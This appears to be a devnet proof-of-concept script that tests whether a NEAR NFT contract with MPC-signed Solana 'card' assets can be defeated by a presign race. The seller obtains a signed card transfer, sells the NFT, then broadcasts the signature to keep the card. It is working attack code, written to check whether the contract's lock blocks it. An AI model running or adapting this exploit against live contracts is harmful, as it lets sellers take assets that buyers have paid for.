// PoC: can a seller keep a card after selling the NEAR NFT, by getting a Solana transfer signed BEFORE the sale?
// 1. Seller (current NFT owner) asks the contract to sign "card -> seller's wallet".
// 2. Seller transfers (sells) the NFT to the buyer. The contract now says the buyer owns it.
// 3. Seller broadcasts the signature obtained in step 1.
// Devnet/testnet only. Usage: tsx src/poc-presign-attack.ts <seller> <buyer> <contract> <tokenId> <attackerKeyFile>
import { Connection, PublicKey, TransactionMessage, VersionedTransaction } from "@solana/web3.js";
import { createPrivateKey, createPublicKey, generateKeyPairSync, sign as edSign } from "node:crypto";
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import bs58 from "bs58";
import { deriveSolanaAddress, loadAccount } from "./lib/mpc.js";
import { confirm, contractSign, coreTransferIx, readCoreAsset } from "./lib/sol.js";

const [sellerId, buyerId, contractId, tokenId, keyFile] = process.argv.slice(2);
if (!keyFile) throw new Error("usage: poc-presign-attack <seller> <buyer> <contract> <tokenId> <attackerKeyFile>");
if (!existsSync(keyFile)) {
  const { privateKey } = generateKeyPairSync("ed25519");
  writeFileSync(keyFile, privateKey.export({ format: "pem", type: "pkcs8" }) as string, { mode: 0o600 });
}
const priv = createPrivateKey(readFileSync(keyFile));
const attacker = new PublicKey(bs58.encode((createPublicKey(priv).export({ format: "der", type: "spki" }) as Buffer).subarray(-32)));
const conn = new Connection("https://api.devnet.solana.com", "confirmed");
const lamports = await conn.getBalance(attacker);
console.log({ attacker: attacker.toBase58(), lamports: String(lamports) });
if (BigInt(lamports) < 1_000_000n) { console.log("Fund the attacker address first."); process.exit(2); }

const seller = loadAccount("testnet", sellerId);
const card = new PublicKey(await deriveSolanaAddress("testnet", contractId, `card/${tokenId}`));
const view = await seller.provider.callFunction<any>({ contractId, method: "get_card", args: { token_id: tokenId } } as never);
const asset = new PublicKey(view.record.card_mint);
const before = await readCoreAsset(conn, asset);
console.log({ nearOwner: view.owner_id, status: view.record.status, solanaOwnerIsCardAddress: before.owner.equals(card) });

for (let attempt = 1; attempt <= 4; attempt++) {
  const { blockhash } = await conn.getLatestBlockhash("confirmed");
  const tx = new VersionedTransaction(new TransactionMessage({ payerKey: attacker, recentBlockhash: blockhash, instructions: [coreTransferIx(asset, before.collection, attacker, card, attacker)] }).compileToV0Message());
  const msg = tx.message.serialize();
  const { sig, ms } = await contractSign(contractId, { kind: "card", owner: seller, tokenId }, msg); // STEP 1
  console.log({ step: "1. seller obtained card signature while owner", mpcMs: ms });
  if (!(await conn.isBlockhashValid(blockhash, { commitment: "processed" })).value) { console.log("blockhash expired during signing, retrying"); continue; }
  try {
    await seller.callFunction({ contractId, methodName: "nft_transfer", args: { receiver_id: buyerId, token_id: tokenId }, deposit: 1n, gas: 30_000_000_000_000n }); // STEP 2
  } catch (e) {
    console.log(JSON.stringify({ result: "ATTACK BLOCKED at the NFT transfer", reason: (String(e).match(/[^"\\:]*lock[^"\\]*/i) ?? [String(e).slice(0, 240)])[0] }, null, 2));
    process.exit(0);
  }
  const after = await seller.provider.callFunction<any>({ contractId, method: "get_card", args: { token_id: tokenId } } as never);
  console.log({ step: "2. NFT sold", nearOwnerNow: after.owner_id });
  tx.addSignature(attacker, new Uint8Array(edSign(null, Buffer.from(msg), priv)));
  tx.addSignature(card, sig);
  const sent = await conn.sendRawTransaction(tx.serialize()); // STEP 3
  await confirm(conn, sent);
  const final = await readCoreAsset(conn, asset);
  console.log(JSON.stringify({ result: final.owner.equals(attacker) ? "ATTACK SUCCEEDED: buyer owns the NFT, seller has the card" : "attack failed", tx: sent, nearOwner: after.owner_id, solanaOwner: final.owner.toBase58() }, null, 2));
  process.exit(0);
}
